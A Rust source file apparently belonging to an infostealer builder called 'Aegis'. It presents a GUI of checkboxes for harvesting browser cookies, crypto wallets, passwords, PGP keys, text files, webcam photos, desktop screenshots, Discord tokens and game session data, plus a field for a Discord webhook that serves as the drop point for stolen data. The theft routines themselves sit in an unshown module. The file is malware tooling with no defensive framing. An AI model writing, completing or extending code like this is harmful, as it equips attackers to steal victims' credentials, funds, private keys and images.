use iced::{
    Element, application,
    wgpu::naga::valid::Uniformity,
    widget::{checkbox, column, container, row, text, text_input},
};

mod utils;

#[derive(Default, Debug, Clone)]
struct App {
    webhook_uri: Option<String>,
    browser_cookies: bool,
    crypto_wallets: bool,
    txt_files: bool,
    passwords: bool,
    pgp_keys: bool,
    webcam_photo: bool,
    screenshot_desktop: bool,
    discord_token: bool,
    minecraft_ssid: bool,
    growtopia_save_dat: bool,
}

#[derive(Debug, Clone)]
enum Message {
    ChangeWebhookUri(String),
    ToggleBrowserCookies(bool),
    ToggleCryptoWallets(bool),
    ToggleTxtFiles(bool),
    TogglePasswords(bool),
    TogglePgpKeys(bool),
    ToggleWebcamPhoto(bool),
    ToggleScreenshotDesktop(bool),
    ToggleDiscordToken(bool),
    ToggleMinecraftSsid(bool),
    ToggleGrowtopiaSaveDat(bool),
    SendWebhook,
}

impl App {
    fn update(&mut self, message: Message) {
        match message {
            Message::ChangeWebhookUri(uri) => {
                self.webhook_uri = Some(uri);
            }
            Message::ToggleBrowserCookies(toggle) => {
                self.browser_cookies = toggle;
            }
            Message::ToggleCryptoWallets(toggle) => {
                self.crypto_wallets = toggle;
            }
            Message::ToggleTxtFiles(toggle) => {
                self.txt_files = toggle;
            }
            Message::TogglePasswords(toggle) => {
                self.passwords = toggle;
            }
            Message::TogglePgpKeys(toggle) => {
                self.pgp_keys = toggle;
            }
            Message::ToggleWebcamPhoto(toggle) => {
                self.webcam_photo = toggle;
            }
            Message::ToggleScreenshotDesktop(toggle) => {
                self.screenshot_desktop = toggle;
            }
            Message::ToggleDiscordToken(toggle) => {
                self.discord_token = toggle;
            }
            Message::ToggleMinecraftSsid(toggle) => {
                self.minecraft_ssid = toggle;
            }
            Message::ToggleGrowtopiaSaveDat(toggle) => {
                self.growtopia_save_dat = toggle;
            }
            Message::SendWebhook => {
                if let Some(uri) = &self.webhook_uri {
                    let hook = utils::webhook::Webhook {
                        name: "Aegis".to_string(),
                        url: uri.clone(),
                        title: "New Connection: ".to_string(),
                        content: "".to_string(),
                        footer: "".to_string(),
                        thumbnail: "".to_string(),
                        avatar: "".to_string(),
                        fields: Vec::new(),
                    };
                    utils::webhook::send(&hook);
                }
            }
        }
    }

    fn view(&self) -> Element<Message> {
        let row = row![
            column![
                checkbox(self.browser_cookies)
                    .label("Browser Cookies")
                    .on_toggle(Message::ToggleBrowserCookies),
                checkbox(self.crypto_wallets)
                    .label("Crypto Wallets")
                    .on_toggle(Message::ToggleCryptoWallets),
                checkbox(self.txt_files)
                    .label("Txt Files")
                    .on_toggle(Message::ToggleTxtFiles),
                checkbox(self.passwords)
                    .label("Passwords")
                    .on_toggle(Message::TogglePasswords),
            ],
            column![
                checkbox(self.pgp_keys)
                    .label("Pgp Keys")
                    .on_toggle(Message::TogglePgpKeys),
                checkbox(self.webcam_photo)
                    .label("Webcam Photo")
                    .on_toggle(Message::ToggleWebcamPhoto),
                checkbox(self.screenshot_desktop)
                    .label("Screenshot Desktop")
                    .on_toggle(Message::ToggleScreenshotDesktop),
                checkbox(self.discord_token)
                    .label("Discord Token")
                    .on_toggle(Message::ToggleDiscordToken),
            ],
            checkbox(self.minecraft_ssid)
                .label("Minecraft Ssid")
                .on_toggle(Message::ToggleMinecraftSsid),
            checkbox(self.growtopia_save_dat)
                .label("Growtopia Save Dat")
                .on_toggle(Message::ToggleGrowtopiaSaveDat),
            text_input(
                "Discord Webhook URL",
                self.webhook_uri.as_deref().unwrap_or("")
            )
            .on_input(Message::ChangeWebhookUri)
        ]
        .padding(20.0);

        container(row).into()
    }
}

fn main() -> iced::Result {
    application(|| App::default(), App::update, App::view).run()
}
